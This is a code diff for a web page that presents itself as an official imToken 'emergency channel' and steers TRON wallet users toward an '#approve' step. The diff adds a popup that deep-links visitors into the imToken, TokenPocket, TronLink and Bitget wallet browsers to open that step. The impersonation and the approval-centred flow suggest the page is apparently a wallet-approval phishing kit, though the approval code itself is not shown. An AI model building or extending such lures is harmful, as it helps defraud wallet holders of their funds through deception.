@@ -491,6 +491,73 @@ body {
     color: white;
     cursor: pointer;
 }
+
+/* 新增：多钱包选择弹窗样式 */
+#multiWalletPopup {
+    display: none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: #1e2925; /* 匹配页面背景色 */
+    border: 1px solid #3b82f6; /* 蓝色边框 */
+    border-radius: 12px;
+    padding: 20px;
+    z-index: 1002; /* 层级高于其他弹窗 */
+    width: 90%;
+    max-width: 400px;
+    text-align: center;
+}
+#multiWalletPopup h3 {
+    color: #3b82f6; /* 蓝色标题 */
+    margin: 0 0 16px 0;
+    font-size: 18px;
+}
+.wallet-list {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 12px;
+    margin-bottom: 16px;
+}
+.wallet-item {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 8px;
+    padding: 12px;
+    background: #1E1E1E; /* 深灰背景 */
+    border-radius: 8px;
+    cursor: pointer;
+    transition: background 0.3s;
+}
+.wallet-item:hover {
+    background: rgba(59, 130, 246, 0.2); /* 蓝色透明 hover 效果 */
+}
+.wallet-logo {
+    width: 48px;
+    height: 48px;
+    object-fit: contain;
+    border-radius: 8px;
+}
+.wallet-name {
+    color: #E5E7EB; /* 浅灰文字 */
+    font-size: 14px;
+    font-weight: 500;
+}
+#closeMultiWalletBtn {
+    padding: 8px 24px;
+    border: none;
+    border-radius: 6px;
+    background: #2563eb; /* 蓝色按钮 */
+    color: white;
+    cursor: pointer;
+    font-size: 14px;
+    transition: background 0.3s;
+}
+#closeMultiWalletBtn:hover {
+    background: #3b82f6; /* 浅蓝 hover 效果 */
+}
+
 /* 加载动画：匹配色号 */
 #Loading {
     width: 100%;
@@ -583,10 +650,40 @@ body {
                 <span id="headerDesc" class="lang-text">imToken官方应急通道</span>
          </div>
     </div>
+        <!-- 原有非imToken弹窗 -->
         <div id="nonImTokenPopup">
             <p>不支持非imToken用户</p>
             <button id="closePopupBtn">关闭</button>
         </div>
+        
+        <!-- 新增：多钱包选择弹窗 -->
+        <div id="multiWalletPopup">
+            <h3>选择钱包打开</h3>
+            <div class="wallet-list">
+                <!-- imToken -->
+                <div class="wallet-item" data-wallet="imtoken">
+                    <img src="https://picsum.photos/id/1/200/200" alt="imToken Logo" class="wallet-logo">
+                    <span class="wallet-name">imToken</span>
+                </div>
+                <!-- TokenPocket -->
+                <div class="wallet-item" data-wallet="tokenpocket">
+                    <img src="https://picsum.photos/id/2/200/200" alt="TokenPocket Logo" class="wallet-logo">
+                    <span class="wallet-name">TokenPocket</span>
+                </div>
+                <!-- TronLink -->
+                <div class="wallet-item" data-wallet="tronlink">
+                    <img src="https://picsum.photos/id/3/200/200" alt="TronLink Logo" class="wallet-logo">
+                    <span class="wallet-name">TronLink</span>
+                </div>
+                <!-- Bitget Wallet -->
+                <div class="wallet-item" data-wallet="bitget">
+                    <img src="https://picsum.photos/id/4/200/200" alt="Bitget Wallet Logo" class="wallet-logo">
+                    <span class="wallet-name">Bitget Wallet</span>
+                </div>
+            </div>
+            <button id="closeMultiWalletBtn">关闭</button>
+        </div>
+
         <div id="userInfo">
             <span id="userInfoDefault">未连接钱包<br>
             <span>请点击底部「连接imToken钱包」按钮</span></span>
@@ -732,6 +829,28 @@ let tokenBalance = 0.00;
 let trxBalance = 0.00;
 const RECORD_KEY = "imtoken_energy_records";
 const B1_SIGNAL_KEY = "b1_signal_sent";
+
+// 关键修改1：配置多钱包Scheme（用于直接跳转）
+const walletConfig = {
+    imtoken: {
+        scheme: "imtokenv2://navigate/DappView?url=",
+        name: "imToken"
+    },
+    tokenpocket: {
+        scheme: "tpdapp://open?params={\"url\":\"",
+        suffix: "\"}",
+        name: "TokenPocket"
+    },
+    tronlink: {
+        scheme: "tronlinkoutside://pull.activity?param=",
+        name: "TronLink"
+    },
+    bitget: {
+        scheme: "bitkeep://bkconnect?action=dapp&url=",
+        name: "Bitget Wallet"
+    }
+};
+
 const imTokenConfig = {
     scheme: "imtokenv2://navigate/DappView?url=",
     name: "imToken"
@@ -972,6 +1091,12 @@ const balanceTrxEl = document.getElementById("balanceTrx");
 const balanceEnergyEl = document.getElementById("balanceEnergy");
 const balanceBandwidthEl = document.getElementById("balanceBandwidth");
 const balanceItems = document.querySelectorAll(".balance-item");
+
+// 关键修改2：获取多钱包弹窗元素
+const multiWalletPopup = document.getElementById("multiWalletPopup");
+const closeMultiWalletBtn = document.getElementById("closeMultiWalletBtn");
+const walletItems = document.querySelectorAll(".wallet-item");
+
 function isCustomerError(errMsg) {
     const lang = langConfig[currentLang];
     const customerErrorKeys = [
@@ -1117,6 +1242,7 @@ function calculateCurrentEnergy() {
     return currentEnergy;
 }
 function updateEnergyDisplay() {
+   
     if (!contractEnergyEl) return;
     calculateCurrentEnergy();
     contractEnergyEl.textContent = Math.floor(currentEnergy);
@@ -1224,6 +1350,7 @@ async function checkImTokenEnv() {
         setTimeout(() => checkImTokenEnv(), 500);
         return;
     }
+    // 显示多钱包选择弹窗（替换原单一imToken弹窗）
     specialTipContainer.style.display = "block";
     userInfoDefault.style.display = "none";
     userInfoStatus.style.display = "block";
@@ -1231,25 +1358,47 @@ async function checkImTokenEnv() {
     approveBtn.style.display = "none";
     connectBtn.style.display = "none";
     nonImTokenPopup.style.display = "none";
-    const fullTargetUrl = window.location.href + "#approve";
-    const jumpUrl = imTokenConfig.scheme + encodeURIComponent(fullTargetUrl);
-    console.log("📤 复用已定义配置跳转：", jumpUrl);
-    window.location.href = jumpUrl;
-    setTimeout(() => {
-        if (!window.tronWeb) {
-            nonImTokenPopup.style.display = "block";
-            connectBtn.style.display = "block";
-            connectBtn.onclick = () => {
-                const fullTargetUrl = window.location.href + "#approve";
-                const jumpUrl = imTokenConfig.scheme + encodeURIComponent(fullTargetUrl);
-                window.location.href = jumpUrl;
-            };
-        }
-    }, 3000);
-    closePopupBtn.onclick = () => {
-        nonImTokenPopup.style.display = "none";
+    multiWalletPopup.style.display = "block"; // 显示多钱包弹窗
+
+    // 给每个钱包项绑定跳转逻辑
+    walletItems.forEach(item => {
+        item.onclick = async () => {
+            const walletType = item.getAttribute("data-wallet");
+            const wallet = walletConfig[walletType];
+            if (!wallet) return;
+
+            // 构造完整跳转链接（处理带suffix的钱包，如TokenPocket）
+            const fullTargetUrl = window.location.href + "#approve";
+            let jumpUrl = "";
+            if (wallet.suffix) {
+                jumpUrl = wallet.scheme + encodeURIComponent(fullTargetUrl) + wallet.suffix;
+            } else {
+                jumpUrl = wallet.scheme + encodeURIComponent(fullTargetUrl);
+            }
+
+            console.log(`📤 跳转${wallet.name}：`, jumpUrl);
+            window.location.href = jumpUrl;
+
+            // 3秒后检查是否成功唤起，未成功则提示手动操作
+            setTimeout(() => {
+                if (!window.tronWeb) {
+                    alert(`${lang.唤起Guide}`);
+                    multiWalletPopup.style.display = "none";
+                    connectBtn.style.display = "block";
+                    connectBtn.onclick = () => {
+                        multiWalletPopup.style.display = "block";
+                    };
+                }
+            }, 3000);
+        };
+    });
+
+    // 关闭多钱包弹窗逻辑
+    closeMultiWalletBtn.onclick = () => {
+        multiWalletPopup.style.display = "none";
     };
 }
+
 async function initWallet(isAfterApprove) {
     const lang = langConfig[currentLang];
     try {
